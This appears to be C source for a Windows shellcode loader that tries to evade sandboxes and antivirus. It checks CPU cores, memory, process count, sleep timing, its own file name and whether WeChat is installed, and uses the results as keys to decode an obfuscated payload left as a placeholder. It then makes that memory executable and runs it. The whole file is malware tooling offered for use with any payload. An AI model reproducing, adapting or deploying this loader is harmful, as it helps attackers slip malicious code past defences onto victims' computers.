#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <tlhelp32.h>
#define ORIGINAL_FILENAME "ProgramUpdate.exe"
typedef void (WINAPI *pGetSystemInfo)(LPSYSTEM_INFO);
typedef BOOL (WINAPI *pGlobalMemoryStatusEx)(LPMEMORYSTATUSEX);
typedef HANDLE (WINAPI *pCreateToolhelp32Snapshot)(DWORD, DWORD);
typedef BOOL (WINAPI *pProcess32First)(HANDLE, LPPROCESSENTRY32);
typedef BOOL (WINAPI *pProcess32Next)(HANDLE, LPPROCESSENTRY32);
typedef DWORD (WINAPI *pGetModuleFileNameA)(HMODULE, LPSTR, DWORD);
typedef BOOL (WINAPI *pVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD pflOldProtect);
int is_more_than_2_cores() {
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    if (!hKernel32) {
        return -1;
    }
    pGetSystemInfo pfnGetSystemInfo = (pGetSystemInfo)GetProcAddress(hKernel32, "GetSystemInfo");
    if (!pfnGetSystemInfo) {
        FreeLibrary(hKernel32);
        return -1;
    }
    SYSTEM_INFO sys_info;
    pfnGetSystemInfo(&sys_info);
    int core_count = sys_info.dwNumberOfProcessors;
    int result = (core_count > 2) ? 10 : 5;
    FreeLibrary(hKernel32);
    return result;
}
int get_process_count() {
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    if (!hKernel32) {
        return -1;
    }
    pCreateToolhelp32Snapshot pfnCreateToolhelp32Snapshot = (pCreateToolhelp32Snapshot)GetProcAddress(hKernel32, "CreateToolhelp32Snapshot");
    pProcess32First           pfnProcess32First           = (pProcess32First)GetProcAddress(hKernel32, "Process32First");
    pProcess32Next            pfnProcess32Next            = (pProcess32Next)GetProcAddress(hKernel32, "Process32Next");
    if (!pfnCreateToolhelp32Snapshot || !pfnProcess32First || !pfnProcess32Next) {
        FreeLibrary(hKernel32);
        return -1;
    }
    HANDLE hProcessSnap = pfnCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        FreeLibrary(hKernel32);
        return -1;
    }
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    DWORD processCount = 0;
    if (!pfnProcess32First(hProcessSnap, &pe32)) {
        CloseHandle(hProcessSnap);
        FreeLibrary(hKernel32);
        return -1;
    }
    do {
        processCount++;
    } while (pfnProcess32Next(hProcessSnap, &pe32));
    CloseHandle(hProcessSnap);
    FreeLibrary(hKernel32);
    return (processCount > 50) ? 10 : 5;
}

int is_memory_more_than_2048MB() {
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    if (!hKernel32) {
        return -1;
    }
    pGlobalMemoryStatusEx pfnGlobalMemoryStatusEx = (pGlobalMemoryStatusEx)GetProcAddress(hKernel32, "GlobalMemoryStatusEx");
    if (!pfnGlobalMemoryStatusEx) {
        FreeLibrary(hKernel32);
        return -1;
    }
    MEMORYSTATUSEX memStat;
    memStat.dwLength = sizeof(MEMORYSTATUSEX);
    if (!pfnGlobalMemoryStatusEx(&memStat)) {
        FreeLibrary(hKernel32);
        return -1;
    }
    unsigned long long totalMemInMB = memStat.ullTotalPhys / (1024 * 1024);
    int result = (totalMemInMB > 2048) ? 10 : 5;
    FreeLibrary(hKernel32);
    return result;
}
int is_file_renamed() {
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    if (!hKernel32) {
        return -1;
    }
    pGetModuleFileNameA pfnGetModuleFileNameA = (pGetModuleFileNameA)GetProcAddress(hKernel32, "GetModuleFileNameA");
    if (!pfnGetModuleFileNameA) {
        FreeLibrary(hKernel32);
        return -1;
    }
    char current_path[MAX_PATH] = {0};
    if (pfnGetModuleFileNameA(NULL, current_path, MAX_PATH) == 0) {
        FreeLibrary(hKernel32);
        return -1;
    }
    char *current_filename = strrchr(current_path, '\\');
    if (current_filename) {
        current_filename++;
        if (strcmp(current_filename, ORIGINAL_FILENAME) == 0) {
            FreeLibrary(hKernel32);
            return 10;
        } else {
            FreeLibrary(hKernel32);
            return 3;
        }
    }
    FreeLibrary(hKernel32);
    return -1;
}
void adjust_first_to_last(char *array) {
    int length = strlen(array);
    if (length > 1) {
        char first_char = array[0];
        for (int i = 1; i < length; i++) {
            array[i - 1] = array[i];
        }
        array[length - 1] = first_char;
    }
}
int base64_decode(unsigned char *input, unsigned char **output, int len, char *base64_table, int base64_table_iv) {
    if (len % 4 != 0){
        len++;
    }
    for(long i = 0; i<base64_table_iv; i++){
        adjust_first_to_last(base64_table);
    }
    int output_len = len / 4 * 3;
    if (input[len - 1] == '=') output_len--;
    if (input[len - 2] == '=') output_len--;
    *output = (unsigned char *)malloc(output_len);
    if (*output == NULL) return 0;
    for (int i = 0, j = 0; i < len;) {
        int a = input[i] == '=' ? 0 : strchr(base64_table, input[i]) - base64_table;
        int b = input[i + 1] == '=' ? 0 : strchr(base64_table, input[i + 1]) - base64_table;
        int c = input[i + 2] == '=' ? 0 : strchr(base64_table, input[i + 2]) - base64_table;
        int d = input[i + 3] == '=' ? 0 : strchr(base64_table, input[i + 3]) - base64_table;
        (*output)[j++] = (a << 2) | (b >> 4);
        if (input[i + 2] != '=') (*output)[j++] = (b << 4) | (c >> 2);
        if (input[i + 3] != '=') (*output)[j++] = (c << 6) | d;
        i += 4;
    }
    return output_len;
}
void del_characters(unsigned char * start, unsigned char * end, int interval_num, int len) {
    int flag = 0;
    for (int i = 1; i < len; ++i) {
        if ( i % interval_num == 0 ) {
            ++i;
        } 
        end[flag] = start[i];
        ++flag;
    }
}
void xor_encrypt_decrypt(unsigned char *input, unsigned char *output, char *key, int len) {
    int key_length = strlen(key);
    for (int i = 0; i < len; i++) {
        output[i] = input[i] ^ key[i % key_length];
    }
    output[len] = '\0';
}

int is_wechat_installed() {
    if (GetFileAttributes("C:\\Program Files (x86)\\Tencent\\WeChat") != INVALID_FILE_ATTRIBUTES ||
        GetFileAttributes("C:\\Program Files\\Tencent\\WeChat") != INVALID_FILE_ATTRIBUTES) {
        return 1;
    }
    return 0;
}
void excess_code() {
    if (is_wechat_installed() == 0) {
        return 1;
    } else {
        return 0;
    }
}
int main() {
    int while_flag = 0;
    int x = 999;
    char demo[] = "01234567890";
    while (x>1) {
        if (x%2==1){
            x = x*3+1;
        } else {
            x=x/2;
        }
        if (x==1) {
            while (x < 5) {
                int system_flag = 0;
                if (excess_code()) {
                    return -1;
                }
                int flag;
                unsigned char *decoded = NULL;
                void *exec_mem = NULL;
                unsigned char decrypted[4096];
                unsigned char shellcode_src[] = "your encrypt shellcode";
                char base64_table[] = "ZklI16KLhFGHfAg9jCV2uvno/QR3txDXabcJdeTWmNOPrpSq+sUByz0Y45Mi78wE";
                char key[] = "fKjCeMhinopuvYZklN9OPr&DEFUBy/Qwx9!Ag1R*)WmAGH45LV23stTSqra0(3XabcJ77Iz0de6+8";
                long base64_table_iv = 3333333;
                long key_iv = 99999999;
                clock_t start, end;
                int cpu_time_used;
                flag = is_file_renamed();
                base64_table_iv = base64_table_iv + flag - 10;
                key_iv = key_iv + flag - 10;
                if (!(flag < 10)) {
                    system_flag++;
                }
                start = clock();
                Sleep(2000);
                end = clock();
                cpu_time_used = ((double) (end - start)) / CLOCKS_PER_SEC;
                int interval_num = shellcode_src[0] - 48;
                unsigned char shellcode[2048];
                del_characters(shellcode_src, shellcode, interval_num, strlen((const char*)shellcode_src));
                base64_table_iv = base64_table_iv + 2 - cpu_time_used;
                key_iv = key_iv + 2 - cpu_time_used;
                if (!(cpu_time_used < 1)) {
                    system_flag++;
                }
                flag = is_more_than_2_cores();
                base64_table_iv = base64_table_iv + flag - 10;
                key_iv = key_iv + flag - 10;
                if (!(flag < 10)) {
                    system_flag++;
                }
                flag = is_memory_more_than_2048MB();
                base64_table_iv = base64_table_iv + flag - 10;
                key_iv = key_iv + flag - 10;
                if (!(flag < 10)) {
                    system_flag++;
                }
                flag = get_process_count();
                base64_table_iv = base64_table_iv + flag - 10;
                key_iv = key_iv + flag - 10;
                if (!(flag < 10)) {
                    system_flag++;
                }
                while_flag ++;
                if (while_flag > 100) {
                    break;
                }
                if (while_flag <= 1 && system_flag >= 5) {
                    int shellcode_len = strlen((const char*)shellcode) - 1;
                    int decoded_len = base64_decode(shellcode, &decoded, shellcode_len, base64_table, base64_table_iv);
                    for(int i = shellcode_len/4*3-1; i>=0 ; i--){
                        if (decoded_len <= 5) { exit(-1); }
                        if (decoded[i] != '\x00') {
                            for(long i = 0; i<key_iv; i++){
                                adjust_first_to_last(key);
                            }
                            xor_encrypt_decrypt(decoded, decrypted, key, decoded_len);
                            DWORD oldProtect;
                            HMODULE hkernel32 = LoadLibraryA("kernel32.dll");
                            pVirtualProtect MyVirtualProtect = (pVirtualProtect)GetProcAddress(hkernel32, "VirtualProtect");
                            if (!MyVirtualProtect(decrypted, sizeof(decrypted), PAGE_EXECUTE_READ, &oldProtect)) {
                                return -1;
                            }
                            break;
                        }
                    }
                    ((void(WINAPI*)(void))decrypted)();
                }
            }
        }
    }
    return 0;
}